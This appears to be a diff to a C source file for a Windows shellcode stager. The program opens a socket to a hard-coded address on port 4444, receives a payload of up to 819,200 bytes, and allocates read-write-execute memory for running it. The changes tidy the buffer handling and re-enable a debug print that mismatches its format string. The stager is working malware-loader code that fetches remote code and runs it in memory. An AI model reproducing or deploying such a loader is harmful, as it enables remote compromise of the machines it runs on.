@@ -1,6 +1,7 @@
 #include <windows.h>
 #include <winsock2.h>
 #include <stdio.h>
+#include <string.h>
 
 #define IP_ADDRESS "10.230.229.13"
 #define PORT 4444
@@ -35,7 +36,10 @@ int main() {
   connect( ConnectSocket, (SOCKADDR*) &saServer, sizeof(saServer) );
 
   // Receive data from port
-  char data[819200] = "";
+  #define BUF_LEN 819200
+  char data[BUF_LEN] = "";
+  memset(data,'\0', BUF_LEN);
+
   int res = 0;
 
   printf("Receiving");
@@ -45,6 +49,7 @@ int main() {
       printf("."); 
     }
     else if (res == 0) {
+
       break;
     }
     else {
@@ -52,8 +57,7 @@ int main() {
       break;
     }
   } while (res > 0);
-
-  //printf("Received payload with size of %s.\n", sizeof(data));
+  printf("Received payload with size of %s.\n", sizeof(data));
 
   printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
